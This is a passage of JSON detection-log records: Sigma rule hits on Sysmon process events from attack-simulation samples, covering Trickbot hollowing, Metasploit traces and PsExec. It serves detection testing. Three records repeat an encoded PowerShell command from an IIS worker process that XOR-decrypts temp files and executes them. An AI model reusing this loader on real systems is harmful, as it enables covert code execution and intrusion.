    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=6778DAD71C8B06264CF2929A5242D2612D3EB026,MD5=2F633406BC9875AA48D6CC5884B70862,SHA256=26E68D4381774A6FD0BF5CA2EACEF55F2AB28536E3176A1C6362DFFC68B22B8A,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-CA8D-5F8A-0000-0020D1090A00",
    "LogonId": "0xa09d1",
    "ParentCommandLine": "C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe --xStart",
    "ParentImage": "C:\\Users\\IEUser\\AppData\\Roaming\\WINWORD.exe",
    "ParentProcessGuid": "747F3D96-D8E5-5F8A-0000-0010E1BC7200",
    "ParentProcessId": 2920,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser",
    "OriginalFileName": "RUNDLL32.EXE"
  },
  {
    "Rule level": "high",
    "title": "Suspicious PowerShell Parent Process",
    "sigma_yml": "proc_creation_win_susp_powershell_parent_process.yml",
    "description": "Detects a suspicious parents of powershell.exe",
    "row_id": 29731,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "365ABB72-3D4A-5CEB-0000-0010FA93FD00",
    "ProcessId": 324,
    "UtcTime": "2019-05-27 01:28:42.700",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 5875,
    "ThreadID": 2260,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-05-27T01:28:42.711005Z",
    "Version": 5,
    "OriginalLogfile": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx-YTE5CO30.json",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\Temp\\",
    "Description": "Windows PowerShell",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-B26B-5CEA-0000-002023240800",
    "LogonId": "0x82423",
    "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v2.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm7486e07c-453c-4f8e-85c6-8c8e3be98cd5 -h \"C:\\inetpub\\temp\\apppools\\DefaultAppPool\\DefaultAppPool.config\" -w \"\" -m 0 -t 20",
    "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
    "ParentProcessGuid": "365ABB72-3251-5CEB-0000-00109E06E100",
    "ParentProcessId": 748,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "IIS APPPOOL\\DefaultAppPool"
  },
  {
    "Rule level": "high",
    "title": "Suspicious PowerShell Encoded Command Patterns",
    "sigma_yml": "proc_creation_win_susp_powershell_cmd_patterns.yml",
    "description": "Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains",
    "row_id": 29731,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "365ABB72-3D4A-5CEB-0000-0010FA93FD00",
    "ProcessId": 324,
    "UtcTime": "2019-05-27 01:28:42.700",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 5875,
    "ThreadID": 2260,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-05-27T01:28:42.711005Z",
    "Version": 5,
    "OriginalLogfile": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx-YTE5CO30.json",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\Temp\\",
    "Description": "Windows PowerShell",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-B26B-5CEA-0000-002023240800",
    "LogonId": "0x82423",
    "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v2.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm7486e07c-453c-4f8e-85c6-8c8e3be98cd5 -h \"C:\\inetpub\\temp\\apppools\\DefaultAppPool\\DefaultAppPool.config\" -w \"\" -m 0 -t 20",
    "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
    "ParentProcessGuid": "365ABB72-3251-5CEB-0000-00109E06E100",
    "ParentProcessId": 748,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "IIS APPPOOL\\DefaultAppPool"
  },
  {
    "Rule level": "high",
    "title": "Rundll32 Without Parameters",
    "sigma_yml": "proc_creation_win_rundll32_without_parameters.yml",
    "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
    "row_id": 36142,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "ProcessGuid": "365ABB72-1282-5D1D-0000-0010DD401B00",
    "ProcessId": 112,
    "UtcTime": "2019-07-03 20:39:30.254",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 8352,
    "ThreadID": 2084,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-07-03T20:39:30.254733Z",
    "Version": 5,
    "OriginalLogfile": "Sysmon_meterpreter_ReflectivePEInjection_to_notepad_.evtx-9LYW63G3.json",
    "CommandLine": "rundll32.exe",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\IEUser\\",
    "Description": "Windows host process (Rundll32)",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=892503B20247B341CFD20DDA5FDACFA41527A087,MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670,IMPHASH=239D911DFA7551A8B735680BC39B2238",
    "IntegrityLevel": "Medium",
    "LogonGuid": "365ABB72-0A6F-5D1D-0000-0020CA350100",
    "LogonId": "0x135ca",
    "ParentCommandLine": "\"C:\\Windows\\system32\\notepad.exe\" ",
    "ParentImage": "C:\\Windows\\System32\\notepad.exe",
    "ParentProcessGuid": "365ABB72-1256-5D1D-0000-0010FB1A1B00",
    "ParentProcessId": 1632,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "IEWIN7\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Trickbot Malware Activity",
    "sigma_yml": "proc_creation_win_malware_trickbot_wermgr.yml",
    "description": "Detects Trickbot malware process tree pattern in which rundll32.exe is parent of wermgr.exe",
    "row_id": 33972,
    "Image": "C:\\Windows\\System32\\wermgr.exe",
    "ProcessGuid": "747F3D96-659E-5F8F-0000-001064E03300",
    "ProcessId": 3408,
    "UtcTime": "2020-10-20 22:33:02.059",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 422695,
    "ThreadID": 4448,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-10-20T22:33:02.063979Z",
    "Version": 5,
    "OriginalLogfile": "rundll32_hollowing_wermgr_masquerading.evtx-LP9E0NP4.json",
    "CommandLine": "C:\\Windows\\system32\\wermgr.exe",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\system32\\",
    "Description": "Windows Problem Reporting",
    "FileVersion": "10.0.17763.1369 (WinBuild.160101.0800)",
    "Hashes": "SHA1=231052FA4311FA3501539E34E21A624921E3C270,MD5=CD042F94B63D67E012CFB4297D313248,SHA256=61A84B2D8CA05C11E79DB8E18FEB0FE4BE1B8D555D0BE2651516B144800153AB,IMPHASH=4E00FCA0721761B10A8A7351CEFB0596",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-6311-5F8F-0000-0020E0100900",
    "LogonId": "0x910e0",
    "ParentCommandLine": "rundll32.exe  c:\\temp\\winfire.dll,DllRegisterServer",
    "ParentImage": "C:\\Windows\\SysWOW64\\rundll32.exe",
    "ParentProcessGuid": "747F3D96-659B-5F8F-0000-001026C33300",
    "ParentProcessId": 2372,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser",
    "OriginalFileName": "WerMgr"
  },
  {
    "Rule level": "high",
    "title": "Script Interpreter Execution From Suspicious Folder",
    "sigma_yml": "proc_creation_win_susp_script_exec_from_env_folder.yml",
    "description": "Detects a suspicious script executions in temporary folders or folders accessible by environment variables",
    "row_id": 30432,
    "Image": "C:\\Users\\bouss\\AppData\\Local\\Temp\\Temp3_lync.zip\\i.exe",
    "ProcessGuid": "00247C92-94E0-6171-0000-00107424987B",
    "ProcessId": 5396,
    "UtcTime": "2021-10-21 16:27:12.839",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "LAPTOP-JU4M3I0E",
    "EventID": 1,
    "EventRecordID": 10920379,
    "ThreadID": 7692,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2021-10-21T16:27:12.858588Z",
    "Version": 5,
    "OriginalLogfile": "sysmon_zipexec.evtx-25UO92L0.json",
    "CommandLine": "\"C:\\Users\\bouss\\AppData\\Local\\Temp\\Temp3_lync.zip\\i.exe\" ",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\bouss\\Desktop\\",
    "Description": "Windows Command Processor",
    "FileVersion": "10.0.18362.449 (WinBuild.160101.0800)",
    "Hashes": "SHA1=8DCA9749CD48D286950E7A9FA1088C937CBCCAD4,MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
    "IntegrityLevel": "Medium",
    "LogonGuid": "00247C92-3C1A-6169-0000-0020C2790700",
    "LogonId": "0x779c2",
    "ParentCommandLine": "cscript.exe  //e:jscript testme.js",
    "ParentImage": "C:\\Windows\\System32\\cscript.exe",
    "ParentProcessGuid": "00247C92-94D6-6171-0000-00100514967B",
    "ParentProcessId": 28176,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "LAPTOP-JU4M3I0E\\bouss",
    "OriginalFileName": "Cmd.Exe"
  },
  {
    "Rule level": "high",
    "title": "Suspicious Encoded PowerShell Command Line",
    "sigma_yml": "proc_creation_win_susp_powershell_enc_cmd.yml",
    "description": "Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)",
    "row_id": 29731,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "365ABB72-3D4A-5CEB-0000-0010FA93FD00",
    "ProcessId": 324,
    "UtcTime": "2019-05-27 01:28:42.700",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 5875,
    "ThreadID": 2260,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-05-27T01:28:42.711005Z",
    "Version": 5,
    "OriginalLogfile": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx-YTE5CO30.json",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\Temp\\",
    "Description": "Windows PowerShell",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-B26B-5CEA-0000-002023240800",
    "LogonId": "0x82423",
    "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v2.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm7486e07c-453c-4f8e-85c6-8c8e3be98cd5 -h \"C:\\inetpub\\temp\\apppools\\DefaultAppPool\\DefaultAppPool.config\" -w \"\" -m 0 -t 20",
    "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
    "ParentProcessGuid": "365ABB72-3251-5CEB-0000-00109E06E100",
    "ParentProcessId": 748,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "IIS APPPOOL\\DefaultAppPool"
  },
  {
    "Rule level": "high",
    "title": "PsExec Service Execution as LOCAL SYSTEM",
    "sigma_yml": "proc_creation_win_suspicious_psexesvc_as_system.yml",
    "description": "Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)",
    "row_id": 33969,
    "Image": "C:\\Windows\\System32\\mspaint.exe",
    "ProcessGuid": "747F3D96-00DD-5FD1-0000-0010F7D25301",
    "ProcessId": 3572,
    "UtcTime": "2020-12-09 16:52:45.011",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 549487,
    "ThreadID": 5040,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
